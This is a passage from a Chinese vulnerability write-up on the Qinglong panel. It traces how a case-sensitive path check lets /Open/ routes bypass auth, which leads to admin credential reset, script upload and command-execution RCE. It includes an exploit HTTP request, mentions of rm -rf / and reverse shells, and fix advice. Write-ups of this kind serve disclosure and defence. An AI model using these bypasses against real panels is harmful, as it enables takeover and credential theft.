- 直接将前端传来的   
req.body  
原封不动地传给了   
resetAuthInfo  
方法，不检查当前登录情况和当前登录用户信息。  
  
  
- 查看下   
resetAuthInfo  
方法实现，定位也简单：  
  
```
// 顶部引用可以追溯到 back/services/user.ts 这个文件
import UserService from '../services/user';
```  
  
服务层逻辑 :  
```
// back/services/user.ts
public async resetAuthInfo(info: Partial<AuthInfo>) {
  // 1. 解构参数：直接从传入的 info 对象中提取敏感字段
  const { retries, twoFactorActivated, password, username } = info;

  // 2. 获取当前数据库中的旧信息
  const authInfo = await this.getAuthInfo();

  // 3. 构造新数据 payload
  // pickBy 配合 isNil 检查：只保留那些 "不为 undefined 且不为 null" 的值
  const payload = pickBy(
    {
      retries,
      twoFactorActivated,
      password,
      username,
    },
    (x) => !isNil(x),
  );

  // 4. 直接更新数据库
  // 它将旧信息 (authInfo) 和新信息 (payload) 合并，然后写入存储
  await this.updateAuthInfo(authInfo, payload);
}
```  
  
至此可以得出：  
- 鉴权层缺陷  
   
(  
back/loaders/express.ts  
)：使用大小写敏感的   
startsWith  
 判断路径白名单，导致   
/Open/  
   
等绕过鉴权中间件。  
  
- 业务层缺陷  
   
(  
back/services/user.ts  
)：  
resetAuthInfo  
 函数无条件信任传入参数，直接更新数据库中的管理员凭证，没有二次验证或权限检查。  
  
业务逻辑执行：  
```
system.ts 控制器接收请求，调用 userService.resetAuthInfo(req.body)。
user.ts 服务层提取 username, password, twoFactorActivated。
pickBy 过滤出有效字段。
updateAuthInfo 将恶意数据写入数据库。
结果：管理员账号被篡改为 attacker / P@ssw0rd123，二步验证被关闭。攻击者可直接登录后台。
```  
  
3.3.2 脚本的增删改查和执行  
  
同样定位到   
back/api/script.ts  
文件中的   
route.put  
函数（  
有run  
）：  
```
// back/api/script.ts (Line 258-276)
route.put(
  '/run',  // 1. 路由路径：对应 /api/scripts/run
  celebrate({
    body: Joi.object({
      filename: Joi.string().required(),
      content: Joi.string().optional().allow(''),
      path: Joi.string().optional().allow(''),
    }),
  }),
  async (req: Request, res: Response, next: NextFunction) => {
    const logger: Logger = Container.get('logger');
    try {
      let { filename, content, path } = req.body;
      if (!path) {
        path = '';
      }

      // 2. 构造临时文件路径 (关键！)
      const { name, ext } = parse(filename);
      const filePath = join(config.scriptPath, path, `${name}.swap${ext}`);

      // 3. 将攻击者提供的 content 写入临时文件
      await writeFileWithLock(filePath, content || '');

      const scriptService = Container.get(ScriptService);

      // 4. 调用服务层执行该文件 (RCE 触发点)
      const result = await scriptService.runScript(filePath);

      res.send(result);
    } catch (e) {
      return next(e);
    }
  },
);
```  
- 接收容易输入  
：允许传入   
content  
(脚本内容)  
 和   
filename  
(文件名)  
，可以在   
content  
 中放入任何  
Shell  
  
命令或  
Node.js  
代码（如   
#!/bin/bash\nrm -rf /  
或反弹  
Shell  
代码  
）。  
  
- 写入临时文件  
：代码中  
2、3  
可见上传的文件，都会被重命名为  
.swap  
   
后缀的临时文件并写入服务器的磁盘文件中（例如  
/ql/data/scripts/evil.swap.sh  
）。  
  
- 调用执行函数  
：第  
4  
点不检查权限和内容直接调用   
scriptService.runScript  
 执行，同密码重置逻辑，进入查看是否有限制（定位同密码重置逻辑一样，后续也都不赘述了）。  
  
关键代码 ：（先写文件再执行）  
  
直接查询   
runScript  
 关键函数  
```
// back/services/script.ts (Line 36-47)
private taskCallbacks(filePath: string): TaskCallbacks {
  return {
    onEnd: async (cp, endTime, diff) => {
      // ！！！ 任务结束后，立即删除文件！ 让我找了半天落地文件
      await rmPath(filePath);
    },
    // ...
  };
}

public async runScript(filePath: string) {
  // 1. 计算相对路径
  // 例如：filePath = "/ql/data/scripts/evil.swap.sh"
  //       relativePath = "evil.swap.sh"
  const relativePath = path.relative(config.scriptPath, filePath);

  // 2. 构造执行命令字符串
  // TASK_COMMAND 通常是 "node" 或者一个封装好的启动脚本 (如 "bash /ql/.../start.sh")
  // "now" 参数告诉调度器立即执行
  const command = `${TASK_COMMAND} ${relativePath} now`;

  // 3. 调用任务调度器执行
  // 这里完全信任传入的 filePath，没有任何内容检查或权限验证
  const pid = await this.scheduleService.runTask(
    `real_time=true ${command}`, // 加上实时执行标记
    this.taskCallbacks(filePath), // 绑定回调函数
    { 
      command, 
      id: relativePath.replace(/ /g, '-'), 
      runOrigin: 'script' 
    },
    'start',
  );

  // 4. 返回进程 ID 给前端
  return { code: 200, data: pid };
}
```  
- 命令真实性  
：只要是存在的脚本文件，系统就会调用底层的解释器  
（Node.js 或 Bash）  
去运行它。  
  
- 文件自删除  
：  
taskCallbacks  
 函数中的  
onEnd  
 回调，会执行完后自动销毁   
.swap.sh  
文件。  
  
- 无沙箱隔离  
：  
runTask  
 直接调用系统命令，无其他隔离环境。  
  
3.3.3-远程代码执行 (RCE) - 方式二：直接命令执行  
  
也是在   
system.ts  
 中发现了   
command-run  
 接口，顺着分析看看：  
```
// back/api/system.ts (Line 326-365 左右)
route.put(
  '/command-run',
  celebrate({
    body: Joi.object({
      command: Joi.string().required(), //  1. 接收用户输入的任意命令
    }),
  }),
  async (req: Request, res: Response, next: NextFunction) => {
    try {
      const systemService = Container.get(SystemService);
      const command = req.body.command; //  2. 直接获取命令字符串

      //  3. 【可疑点】这里用命令本身去 grep 查找 ID？
      // 如果 command 包含特殊字符，这里的 shell 拼接可能会出问题，
      // 但主要的风险在下面的 systemService.run
      const idStr = `cat ${config.crontabFile} | grep -E "${command}" | ...`; 
      let id = await promiseExec(idStr);

      const uniqPath = await getUniqPath(command, id);
      const logTime = dayjs().format('YYYY-MM-DD-HH-mm-ss-SSS');
      const logPath = `${uniqPath}/${logTime}.log`;

      res.setHeader('Content-type', 'application/octet-stream');

      //  4. 调用 Service 层执行命令
      await systemService.run(
        { ...req.body, logPath }, // 把原始命令传进去
        { ...callbacks... }
      );
    } catch (e) {
      return next(e);
    }
  },
);
```  
- 输入就是命令：接口直接接收   
command  
 字段，可以执行  
shell  
命令甚至是  
反弹  
shell  
。  
  
  
- 执行命令：直接调用   
systemService.run  
 去执行（同上对服务层进行审核）。  
  
关键代码函数如下（直接查询   
run  
 关键函数）：  
```
// back/services/system.ts (Line 336-344)
public async run(
  { command, logPath }: { command: string; logPath?: string }, 
  callback: TaskCallbacks
) {
  // 1. 关键逻辑判断
  // 如果传入的命令不以 TASK_COMMAND 开头，就自动加上它
  if (!command.startsWith(TASK_COMMAND)) {
    command = `${TASK_COMMAND} ${command}`;
  }

  const logPathPrefix = logPath ? `real_log_path=${logPath}` : '';

  // 2. 【致命一击】直接调用任务调度器执行
  // 这里的 command 现在变成了 "TASK_COMMAND <用户输入的命令>"
  this.scheduleService.runTask(
    `${logPathPrefix} real_time=true ${command}`, 
    callback, 
    {
      command,
      id: command.replace(/ /g, '-'),
      runOrigin: 'system',
    }
  );
}

// Line 290
const cp = spawn('real_time=true ql update false', { shell: '/bin/bash' });

// Line 303
const cp = spawn(cmd, { shell: '/bin/bash', ... });
```  
- 无文件落地  
：命令直接在内存中构造，直接传递给进程创建函数。  
  
- 直接使用shell  
:   
'/bin/bash'  
来执行命令。  
  
- TASK_COMMAND  
 可能是封装好的启动脚本，作用是“执行后面的内容”。  
  
3.3.4-  
文件上传（头像上传，其它也有静态的文件上传）  
```
// back/api/user.ts (推测路由定义位置)
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    //  文件保存路径：config.uploadPath
    // 通常是 /ql/data/upload/
    cb(null, config.uploadPath);
  },
  filename: function (req, file, cb) {
    //  文件名重命名策略：UUID + 原始扩展名
    const ext = path.parse(file.originalname).ext; // 保留后缀，如 .php, .html, .sh
    const key = uuidV4(); // 生成随机 UUID
    cb(null, key + ext);  // 最终文件名：550e8400-e29b-41d4-a716-446655440000.php
  },
});

route.put(
  '/avatar',
  upload.single('avatar'), //  1. 使用 multer 处理名为 'avatar' 的文件上传
  celebrate({
    // 可能有一些额外的参数校验
  }),
  async (req: Request, res: Response, next: NextFunction) => {
    try {
      const userService = Container.get(UserService);

      //  2. 获取上传后的文件信息
      // multer 会将文件信息挂在 req.file 上
      if (!req.file) {
        return res.send({ code: 400, message: '未找到文件' });
      }

      const fileName = req.file.filename; // 例如：uuid.ext

      //  3. 调用 Service 层更新用户头像记录
      // 注意：这里只是更新数据库中的头像路径记录，文件本身已经被 multer 写入了磁盘
      await userService.updateAvatar(fileName); 

      res.send({ code: 200, data: fileName, message: '上传成功' });
    } catch (e) {
      return next(e);
    }
  },
);
```  
- 文件被保存到  
config.uploadPath  
 目录。  
  
- 文件名虽然被随机化了，但扩展名被保留了。  
  
- 没有文件类型检查！  
 代码中没有判断   
file.mimetype  
 或扩展名白名单。攻击者可以上传任何类型的文件。  
  
如何访问呢？静态资源暴露  
```
// back/loaders/express.ts (Line 26)
app.use(`${config.api.prefix}/static`, express.static(config.uploadPath));
```  
- Express  
配置了静态资源服务：  
/  
api/static  
  
映射到  
/ql/data/upload/  
，可通过   
/api/static/.  
直接访问。  
  
- 文件上传（未授权文件上传）  
  
```
POST /Open/scripts HTTP/1.1
Host: target-host:5700
Content-Type: multipart/form-data; boundary=----BOUNDARY
------BOUNDARY
Content-Disposition: form-data; name="file"; filename="pwn.sh"
Content-Type: application/x-sh
\#!/bin/bash
id > /data/scripts/pwned.txt
------BOUNDARY
Content-Disposition: form-data; name="filename"
pwn.sh
------BOUNDARY--
```  
- 结果：  
pwn.sh  
被写入  
data/scripts/  
，可后续配合执行接口实现  
RCE  
。  
  
- 环境变量批量上传（间接敏感数据污染）  
  
```
接口：POST /api/envs/upload
```  
- 上传逻辑写入  
config.scriptPath  
中的  
JSON  
文件，并导入为环境变量，属于配置污染风险，没有接着看了  
  
3.3.5-  
其他未授权敏感接口示例  
  
仅列举部分关键接口，所有以  
/api/  
或  
/open/  
开头的接口理论上都可通过路径大小写绕过鉴权：  
  
系统备份与导入：  
```
PUT /api/system/data/export → 通过 /Open/system/data/export
```  
- 导出   
db、upload  
等目录数据，含数据库及所有上传内容。  
  
```
PUT /api/system/data/import → 通过 /Open/system/data/import
```  
- 导入攻击者构造的备份数据，可能覆盖系统配置与任务。  
  
环境变量管理：  
```
GET/POST/PUT/DELETE /api/envs/... → /Open/envs/..
```  
- 环境变量一般包含  
Cookie、Token   
等高敏感信息，攻击者可批量读取与修改。  
  
脚本管理：  
```
GET /api/scripts
GET /api/scripts/detail
POST /api/scripts
PUT /api/scripts
DELETE /api/scripts 等 → /Open/scripts/...
```  
- 攻击者可列举、修改、删除面板所有脚本任务。  
  
用户信息与通知配置：  
  
```
GET /api/user、GET/PUT /api/user/notification → /Open/user/...
```  
- 可读取用户信息、修改通知方式等。  
  
0x4 修复建议  
  
**1、暂无最新版本**  
：  
青龙面板最近更新是在2025年12月26日  
，可持续关注项目  
```
https://github.com/whyour/qinglong/tags
```  
  
2、临时防护措施  
：  
- 启用大小写敏感路由**：在Express初始化时开启caseSensitiveRouting: true，让路由匹配对大小写敏感，与中间件中字符串匹配语义保持一致**  
  
- 避免公网暴露  
：  
仅允许可信IP  
段访问管理端口  
  
- 部署WAF拦截  
：  
应用前部署防火墙/WAF等设备阻拦明文攻击  
  
- 检查系统是否有入侵迹象：  
查询用户是否有异常登录，全屏扫描恶意文件等  
  
  
  
免责声明  
：  
  
本文仅用于安全研究目的，请勿用于非法渗透测试活动。实际操作需获得目标系统所有者明确授权。因使用本文提  
供的方法造成的任何法律后果，由使用者自行承担。  
  
/**哇~我简直是超人**/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/eefCd8vibaic0X8p3aL3iaRnQnvOhrJeZPaEYmlYfPFfNBGBIgtxBEnuPXfKDObN6nibZ0ErSv0BFeS2ITrRQOelNHjAhiaWc7PULUBSQkkND4zs/640?wx_fmt=jpeg&from=appmsg "")  
  
免责声明  
：本文仅用于安全研究目的，未经授权不得用于非法渗透测试活动。  
  
